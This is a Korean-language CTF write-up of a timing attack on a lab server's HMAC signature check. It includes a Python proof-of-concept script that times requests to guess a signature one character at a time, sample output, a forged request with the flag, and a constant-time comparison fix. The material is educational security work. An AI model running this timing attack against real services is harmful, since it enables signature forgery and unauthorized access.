+++
title = "VulnABLE CTF [LUXORA] Write-up: Timing Attack 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Timing Attack", "Silver", "HMAC", "Byte-at-a-time", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Timing Attack 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Crypto & Secrets Layer (Timing Attack)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/timing/silver`
- **목표**: 서버가 API 요청의 무결성을 검증하기 위해 사용하는 서명(Signature, HMAC) 비교 로직이 **상수 시간(Constant-time)**이 아닌 취약한 문자열 비교 함수(`==`)를 사용하는 점을 악용하여, 서명을 한 글자씩 유추(Byte-at-a-time)해 내어 위조된 요청을 통과시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/timing/silver` API는 사용자가 보낸 데이터와 서명(Signature)을 함께 받아 검증합니다.

**[정상 실패 시도]**
```http
POST /timing/silver/api HTTP/1.1
Content-Type: application/json

{"data":"test","signature":"00000000000000000000000000000000"}
```
➔ 서버 응답: `{"error": "Invalid signature"}` (응답 시간: ~10ms)

**[해커의 사고 과정]**
1. 서버는 내가 보낸 `data` 에 대해 올바른 HMAC 서명을 자체적으로 계산하고, 내가 보낸 `signature` 와 비교할 것이다.
2. 만약 서버가 이 두 문자열을 비교할 때 일반적인 `==` 연산자나 `strcmp()` 함수를 쓴다면?
3. 이 함수들은 문자열의 앞에서부터 한 글자씩 비교하다가, **틀린 글자가 나오는 순간 즉시 비교를 중단(Early Exit)** 한다.
4. 즉, 내가 보낸 서명의 첫 번째 글자가 정답과 일치하면 비교 함수가 두 번째 글자까지 읽어야 하므로, 완전히 틀린 서명을 보냈을 때보다 아주 미세하게(수 나노초~마이크로초) 시간이 더 걸릴 것이다!

---

## 💥 2. 취약점 식별 및 타이밍 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Guess: A)--> [ Server ] (Returns in 10ms)
[ Attacker ] --(Guess: B)--> [ Server ] (Returns in 10ms)
[ Attacker ] --(Guess: C)--> [ Server ] (Returns in 50ms) -> Correct Char!
```


이 공격은 문자 하나가 맞을 때마다 아주 미세하게 증가하는 응답 시간을 측정하여, 비밀값을 한 글자씩 알아내는 기법입니다. 네트워크 지연(Latency)의 영향을 받으므로 수십~수백 번의 평균을 내어 통계적으로 접근해야 합니다.

### 💡 파이썬 측정 스크립트 작성 (개념 증명용)
이 스크립트는 32자리 16진수(Hex) 문자열 서명의 첫 번째 글자를 유추합니다.

```python
import requests
import time
import statistics

url = "http://localhost:3000/timing/silver/api"
chars = "0123456789abcdef"
known_signature = ""

print("[*] Starting Byte-at-a-time Timing Attack...")

# 첫 번째 글자만 테스트한다고 가정 (실제로는 루프를 32번 돌아야 함)
for pos in range(1): 
    times_per_char = {}
    
    for char in chars:
        # 나머지 자리는 0으로 채움
        guess = known_signature + char + "0" * (31 - len(known_signature))
        payload = {"data": "test", "signature": guess}
        
        times = []
        # 네트워크 노이즈를 줄이기 위해 50번씩 측정하여 평균을 냄
        for _ in range(50):
            start = time.perf_counter()
            requests.post(url, json=payload)
            end = time.perf_counter()
            times.append(end - start)
            
        times_per_char[char] = statistics.median(times)
        print(f"Guessing '{char}': Median Time {times_per_char[char]*1000:.4f} ms")
        
    # 가장 오래 걸린 글자가 정답!
    best_char = max(times_per_char, key=times_per_char.get)
    known_signature += best_char
    print(f"\n[+] Found char at position {pos}: {best_char}")
```

*(참고: 챌린지 환경에서는 교육의 편의를 위해 일반적인 `strcmp`보다 타이밍 차이가 확연히 나도록(글자당 50ms 지연 등) 인위적으로 설정되어 있을 수 있습니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

스크립트를 실행하면 글자마다 시간이 출력됩니다.

### 🔍 스크립트 실행 결과 (인위적 지연이 들어간 환경 가정)
```text
Guessing '0': Median Time 10.12 ms
Guessing '1': Median Time 10.15 ms
...
Guessing 'f': Median Time 61.34 ms   <-- 확연히 높음!

[+] Found char at position 0: f
```
첫 글자가 `f` 임을 알아냈습니다.
이런 식으로 `f2`, `f2a` 등 한 글자씩 32번 반복하여 완전한 유효 서명을 복구해냅니다.

### 🔍 권한 탈취
복구해 낸 서명을 사용하여 위조된 데이터를 서버에 전송합니다.
```http
POST /timing/silver/api
{"data":"test","signature":"f2a9...[복구된 32자리 서명]"}
```

```text
[!] System: Valid signature provided. API unlocked.
FLAG: FLAG{TIMING_🥈_BYTE_AT_A_TIME_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

문자열 비교 시 발생하는 조기 종료(Early Exit) 메커니즘을 파고들어, 암호학적으로 안전한 HMAC 서명이라 할지라도 그 검증 과정이 허술하면 무력화될 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{TIMING_🥈_BYTE_AT_A_TIME_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
보안과 관련된 값(패스워드 해시, API 토큰, HMAC 서명 등)을 검증할 때, 실행 속도를 최적화하기 위해 고안된 일반 문자열 비교 연산자(`==`, `===`)를 사용한 것이 치명적인 실수입니다.

* **안전한 패치 가이드 (상수 시간 비교 연산자 사용)**
비밀 값 검증에는 반드시 실행 시간이 문자열의 일치 여부와 관계없이 **항상 일정한(Constant-Time)** 비교 함수를 사용해야 합니다.

```javascript
// Node.js (crypto 모듈) 안전한 검증 로직 예시
const crypto = require('crypto');

// ❌ 취약한 비교 (타이밍 공격 가능)
// if (userInputSignature === expectedSignature) { ... }

// ✅ 안전한 비교 (상수 시간 비교 함수 사용)
const inputBuffer = Buffer.from(userInputSignature);
const expectedBuffer = Buffer.from(expectedSignature);

// 길이가 다를 때는 바로 거절하되(이건 타이밍 공격 대상이 아님), 길이가 같으면 상수 시간 비교 수행
if (inputBuffer.length !== expectedBuffer.length) {
    return false;
}

if (crypto.timingSafeEqual(inputBuffer, expectedBuffer)) {
    return true; // 안전하게 검증 통과
}
```
`crypto.timingSafeEqual()` 함수는 첫 번째 글자가 틀리더라도 끝 글자까지 비트 연산(XOR)을 모두 수행한 뒤 결과를 반환하므로 해커는 타이밍 차이를 전혀 느낄 수 없습니다.